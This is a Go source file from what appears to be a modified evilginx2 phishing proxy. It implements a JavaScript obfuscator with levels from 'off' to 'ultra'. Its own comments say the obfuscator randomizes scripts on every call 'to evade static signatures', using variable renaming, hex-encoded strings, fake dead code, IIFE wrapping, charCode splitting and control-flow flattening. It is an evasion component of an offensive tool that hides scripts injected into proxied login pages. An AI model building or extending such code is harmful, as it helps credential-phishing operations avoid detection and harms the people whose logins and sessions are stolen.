package core

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"regexp"
	"strings"
	"sync"
	"unicode"

	"github.com/kgretzky/evilginx2/log"
)

// ObfuscationLevel controls how aggressively JS is obfuscated.
// Valid values: "off", "low", "medium", "high", "ultra"
var ObfuscationLevel = "medium"
var obfuscationMu sync.RWMutex

// SetObfuscationLevel safely sets the global obfuscation level.
// Unrecognized values are ignored (level stays unchanged).
func SetObfuscationLevel(level string) {
	switch level {
	case "off", "low", "medium", "high", "ultra":
		obfuscationMu.Lock()
		ObfuscationLevel = level
		obfuscationMu.Unlock()
	default:
		log.Warning("js_obfuscator: unknown level %q — keeping %q", level, GetObfuscationLevel())
	}
}

// GetObfuscationLevel safely reads the current obfuscation level.
func GetObfuscationLevel() string {
	obfuscationMu.RLock()
	defer obfuscationMu.RUnlock()
	return ObfuscationLevel
}

// ObfuscateJS randomizes JavaScript code on every call to evade static signatures
// while preserving functionality. Behavior depends on ObfuscationLevel:
//
//	"off"    — return script unchanged
//	"low"    — rename variables only
//	"medium" — rename variables + encode strings (default)
//	"high"   — medium + dead code blocks + IIFE wrapper
//	"ultra"  — high + string-to-charCode splitting + control flow flattening
func ObfuscateJS(script string) (result string) {
	// Panic recovery — never crash the proxy over obfuscation
	defer func() {
		if r := recover(); r != nil {
			log.Warning("js_obfuscator panic: %v — returning original script", r)
			result = script
		}
	}()

	level := GetObfuscationLevel()

	// ── off ──────────────────────────────────────────────────
	if level == "off" {
		return script
	}

	// ── Step 1: Extract and map variable declarations (low+) ─
	varMap := make(map[string]string)

	varDeclPattern := regexp.MustCompile(`\b(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=`)
	matches := varDeclPattern.FindAllStringSubmatch(script, -1)

	for _, match := range matches {
		varName := match[2]
		if _, exists := varMap[varName]; !exists {
			if !isProtectedName(varName) {
				varMap[varName] = generateRandomVarName()
			}
		}
	}

	result = script

	var varNames []string
	for name := range varMap {
		varNames = append(varNames, name)
	}
	sortByLengthDesc(varNames)

	for _, oldName := range varNames {
		newName := varMap[oldName]
		result = replaceVariableName(result, oldName, newName)
	}

	// ── low stops here ───────────────────────────────────────
	if level == "low" {
		result = randomizeWhitespace(result)
		return result
	}

	// ── Step 2: Obfuscate string literals (medium+) ──────────
	result = obfuscateStringLiterals(result)

	// ── medium stops here ────────────────────────────────────
	if level == "medium" {
		result = randomizeWhitespace(result)
		return result
	}

	// ── Step 3: Dead code blocks (high+) ─────────────────────
	deadCode := GenerateDeadCode()

	// ── Step 4: Randomize whitespace (high+) ─────────────────
	result = randomizeWhitespace(result)

	// ── Step 5: Wrap in IIFE with random name (high+) ────────
	wrapperName := generateRandomVarName()
	result = fmt.Sprintf("(function %s(){%s\n%s})();", wrapperName, deadCode, result)

	// ── high stops here ──────────────────────────────────────
	if level == "high" {
		return result
	}

	// ── Step 6: String-to-charCode splitting (ultra) ─────────
	result = splitStringsToCharCodes(result)

	// ── Step 7: Control flow flattening (ultra) ──────────────
	result = flattenControlFlow(result)

	return result
}

// isProtectedName checks if a variable name should not be renamed
// (DOM APIs, built-in objects, common property names, etc.)
func isProtectedName(name string) bool {
	protected := map[string]bool{
		// DOM/Window APIs
		"document": true, "window": true, "console": true, "navigator": true,
		"location": true, "history": true, "screen": true, "localStorage": true,
		"sessionStorage": true, "setTimeout": true, "setInterval": true,
		"addEventListener": true, "removeEventListener": true,
		// Common properties
		"value": true, "focus": true, "click": true, "submit": true,
		"length": true, "name": true, "type": true, "id": true,
		"className": true, "style": true, "innerHTML": true, "textContent": true,
		// Common DOM methods
		"querySelector": true, "getElementById": true,
		"getElementsByClassName": true, "getElementsByTagName": true,
		"setAttribute": true, "getAttribute": true, "createElement": true,
		"appendChild": true, "removeChild": true, "replaceChild": true,
		// Encoding
		"atob": true, "btoa": true, "encodeURIComponent": true, "decodeURIComponent": true,
		// Other globals
		"Array": true, "Object": true, "String": true, "Number": true,
		"Boolean": true, "Date": true, "Math": true, "JSON": true,
		"Promise": true, "Error": true, "RegExp": true,
	}
	return protected[name]
}

// generateRandomVarName creates a random valid JavaScript variable name
func generateRandomVarName() string {
	b := make([]byte, 6)
	rand.Read(b)
	return "_" + hex.EncodeToString(b)
}

// replaceVariableName replaces a variable name while preserving property access
func replaceVariableName(code, oldName, newName string) string {
	// Don't replace if it's a property access (e.g., obj.oldName or .oldName())
	// Use regex with word boundaries and negative lookbehind/lookahead for dots
	
	// Replace variable declarations
	code = regexp.MustCompile(`\b(var|let|const)\s+`+regexp.QuoteMeta(oldName)+`\b`).
		ReplaceAllString(code, "${1} "+newName)
	
	// Replace function parameters
	code = regexp.MustCompile(`\(([^)]*\b)`+regexp.QuoteMeta(oldName)+`\b([^)]*)\)`).
		ReplaceAllStringFunc(code, func(s string) string {
			return strings.Replace(s, oldName, newName, -1)
		})
	
	// Replace standalone references (not preceded or followed by a dot)
	pattern := fmt.Sprintf(`([^.a-zA-Z0-9_$])%s([^a-zA-Z0-9_$])`, regexp.QuoteMeta(oldName))
	re := regexp.MustCompile(pattern)
	for re.MatchString(code) {
		code = re.ReplaceAllString(code, "${1}"+newName+"${2}")
	}
	
	// Handle beginning of string
	pattern = fmt.Sprintf(`^%s([^a-zA-Z0-9_$])`, regexp.QuoteMeta(oldName))
	code = regexp.MustCompile(pattern).ReplaceAllString(code, newName+"${1}")
	
	// Handle end of string
	pattern = fmt.Sprintf(`([^.a-zA-Z0-9_$])%s$`, regexp.QuoteMeta(oldName))
	code = regexp.MustCompile(pattern).ReplaceAllString(code, "${1}"+newName)
	
	return code
}

// obfuscateStringLiterals encodes string literals randomly
// Skips strings that look like CSS selectors or DOM-related
func obfuscateStringLiterals(code string) string {
	// Simple manual string extraction — find "..." and '...' pairs
	doubleQuotePattern := regexp.MustCompile(`"([^"\\]*(?:\\.[^"\\]*)*)"`)
	singleQuotePattern := regexp.MustCompile(`'([^'\\]*(?:\\.[^'\\]*)*)'`)

	obfuscateMatch := func(match string) string {
		quote := match[0:1]
		content := match[1 : len(match)-1]
		
		// Skip if it looks like a CSS selector or DOM ID/class
		if strings.HasPrefix(content, "#") || strings.HasPrefix(content, ".") ||
			strings.Contains(content, "[") || len(content) < 3 {
			return match
		}
		
		// Skip common DOM-related strings
		if isCommonDOMString(content) {
			return match
		}
		
		// Randomly choose encoding method (50% chance to encode)
		b := make([]byte, 1)
		rand.Read(b)
		if b[0]%2 == 0 {
			return match // Keep original
		}
		
		// Encode to hex
		_ = quote
		return "\"" + encodeStringToHex(content) + "\""
	}

	code = doubleQuotePattern.ReplaceAllStringFunc(code, obfuscateMatch)
	code = singleQuotePattern.ReplaceAllStringFunc(code, obfuscateMatch)
	return code
}

// isCommonDOMString checks if a string is a common DOM-related value
func isCommonDOMString(s string) bool {
	common := []string{
		"text", "button", "submit", "click", "change", "input",
		"GET", "POST", "json", "html", "xml", "true", "false",
	}
	
	for _, c := range common {
		if strings.EqualFold(s, c) {
			return true
		}
	}
	return false
}

// encodeStringToHex converts a string to \xNN escape sequences
func encodeStringToHex(s string) string {
	var result strings.Builder
	for _, r := range s {
		if r < 128 && unicode.IsPrint(r) && r != '\\' {
			// Randomly choose between hex and unicode escape
			b := make([]byte, 1)
			rand.Read(b)
			if b[0]%3 == 0 {
				fmt.Fprintf(&result, "\\x%02x", r)
			} else {
				result.WriteRune(r)
			}
		} else {
			result.WriteRune(r)
		}
	}
	return result.String()
}

// GenerateDeadCode returns 2-5 lines of realistic-looking but unreachable
// JavaScript: variable declarations, always-false if-checks, and math ops.
func GenerateDeadCode() string {
	// Decide how many lines (2-5)
	lineCount := cryptoRandInt(4) + 2

	var lines []string
	for i := 0; i < lineCount; i++ {
		lines = append(lines, generateDeadCodeLine())
	}
	return strings.Join(lines, "\n")
}

// generateDeadCodeLine produces a single line of dead code.
func generateDeadCodeLine() string {
	v := generateRandomVarName()
	v2 := generateRandomVarName()

	b := make([]byte, 1)
	rand.Read(b)
	switch b[0] % 8 {
	case 0:
		return fmt.Sprintf("var %s=Date.now();", v)
	case 1:
		return fmt.Sprintf("var %s=Math.random();if(%s>2){var %s=%s+1;}", v, v, v2, v)
	case 2:
		return fmt.Sprintf("var %s=![];", v)
	case 3:
		return fmt.Sprintf("var %s=typeof undefined;", v)
	case 4:
		// Always-false comparison
		n := cryptoRandInt(9999)
		return fmt.Sprintf("var %s=%d;if(%s<0){console.log(%s);}", v, n+10000, v, v)
	case 5:
		// Math operation nobody uses
		n := cryptoRandInt(255)
		return fmt.Sprintf("var %s=((0x%x^0xff)>>>0).toString(16);", v, n)
	case 6:
		// Unreachable block guarded by always-false
		return fmt.Sprintf("var %s=1;var %s=2;if(%s===%s){void 0;}", v, v2, v, v2)
	default:
		// Empty array manipulation
		return fmt.Sprintf("var %s=[];%s.push(%s.length);", v, v, v)
	}
}

// randomizeWhitespace adds or removes random whitespace
func randomizeWhitespace(code string) string {
	// Randomly add spaces around operators (sometimes)
	b := make([]byte, 1)
	rand.Read(b)
	
	if b[0]%2 == 0 {
		// Add extra spaces
		code = regexp.MustCompile(`([=+\-*/])`).ReplaceAllString(code, " $1 ")
	} else {
		// Compress some whitespace
		code = regexp.MustCompile(`\s+`).ReplaceAllString(code, " ")
	}
	
	// Randomly add newlines
	rand.Read(b)
	if b[0]%2 == 0 {
		code = strings.Replace(code, ";", ";\n", -1)
	}
	
	return code
}

// sortByLengthDesc sorts strings by length in descending order
func sortByLengthDesc(arr []string) {
	for i := 0; i < len(arr); i++ {
		for j := i + 1; j < len(arr); j++ {
			if len(arr[i]) < len(arr[j]) {
				arr[i], arr[j] = arr[j], arr[i]
			}
		}
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Ultra-level transformations
// ─────────────────────────────────────────────────────────────────────────────

// splitStringsToCharCodes converts JS string literals into
// String.fromCharCode(n1,n2,...) calls.
// Example: "abc" → String.fromCharCode(97,98,99)
func splitStringsToCharCodes(code string) string {
	// Match double-quoted and single-quoted strings (non-greedy, skip escaped quotes)
	pattern := regexp.MustCompile(`"([^"\\]*(?:\\.[^"\\]*)*?)"|'([^'\\]*(?:\\.[^'\\]*)*?)'`)

	return pattern.ReplaceAllStringFunc(code, func(match string) string {
		// Extract content (strip surrounding quotes)
		content := match[1 : len(match)-1]

		// Skip very short strings, CSS selectors, and DOM strings
		if len(content) < 3 || strings.HasPrefix(content, "#") ||
			strings.HasPrefix(content, ".") || strings.Contains(content, "[") ||
			isCommonDOMString(content) {
			return match
		}

		// 50% chance to transform — keeps output less predictable
		b := make([]byte, 1)
		rand.Read(b)
		if b[0]%2 == 0 {
			return match
		}

		var codes []string
		for _, r := range content {
			codes = append(codes, fmt.Sprintf("%d", r))
		}
		return "String.fromCharCode(" + strings.Join(codes, ",") + ")"
	})
}

// flattenControlFlow wraps the script body in a while(true)/switch dispatcher.
// Each original statement gets a random case label; a state variable controls
// which case runs next, and the final case breaks out of the while loop.
func flattenControlFlow(code string) string {
	// Split on semicolons that are NOT inside strings or parens
	// (simple heuristic: split on top-level semicolons followed by newline or end)
	statements := splitStatements(code)

	if len(statements) < 3 {
		// Not enough statements to bother flattening
		return code
	}

	// Generate a random state variable and dispatcher labels
	stateVar := generateRandomVarName()
	exitLabel := cryptoRandInt(9000) + 1000

	// Assign a unique random label to each statement
	type caseBlock struct {
		label int
		code  string
	}
	var blocks []caseBlock
	usedLabels := map[int]bool{exitLabel: true}

	for _, stmt := range statements {
		stmt = strings.TrimSpace(stmt)
		if stmt == "" {
			continue
		}
		label := uniqueRandLabel(usedLabels)
		blocks = append(blocks, caseBlock{label: label, code: stmt})
	}

	if len(blocks) == 0 {
		return code
	}

	// Build the switch/case body with a labelled while loop
	// so the exit case can break out of the outer loop.
	firstLabel := blocks[0].label
	loopLabel := generateRandomVarName()

	var out strings.Builder
	out.WriteString(fmt.Sprintf("var %s=%d;", stateVar, firstLabel))
	out.WriteString(loopLabel + ":while(true){switch(" + stateVar + "){")

	for i, blk := range blocks {
		var nextLabel int
		if i+1 < len(blocks) {
			nextLabel = blocks[i+1].label
		} else {
			nextLabel = exitLabel
		}
		out.WriteString(fmt.Sprintf("case %d:%s;%s=%d;break;", blk.label, blk.code, stateVar, nextLabel))
	}
	out.WriteString(fmt.Sprintf("case %d:break %s;", exitLabel, loopLabel))
	out.WriteString("}}")

	return out.String()
}

// splitStatements splits JS source on top-level semicolons.
// It respects nesting in parens/braces/brackets so compound
// statements aren't torn apart.
func splitStatements(code string) []string {
	var parts []string
	depth := 0
	start := 0

	for i := 0; i < len(code); i++ {
		ch := code[i]
		switch ch {
		case '(', '{', '[':
			depth++
		case ')', '}', ']':
			if depth > 0 {
				depth--
			}
		case ';':
			if depth == 0 {
				part := strings.TrimSpace(code[start:i])
				if part != "" {
					parts = append(parts, part)
				}
				start = i + 1
			}
		}
	}
	// Trailing content
	tail := strings.TrimSpace(code[start:])
	if tail != "" {
		parts = append(parts, tail)
	}
	return parts
}

// cryptoRandInt returns a cryptographically random int in [0, max).
func cryptoRandInt(max int) int {
	if max <= 0 {
		return 0
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil || n == nil {
		return 0
	}
	return int(n.Int64())
}

// uniqueRandLabel picks a random case label not already in the set.
func uniqueRandLabel(used map[int]bool) int {
	for {
		label := cryptoRandInt(89999) + 10000 // 10000-99999
		if !used[label] {
			used[label] = true
			return label
		}
	}
}
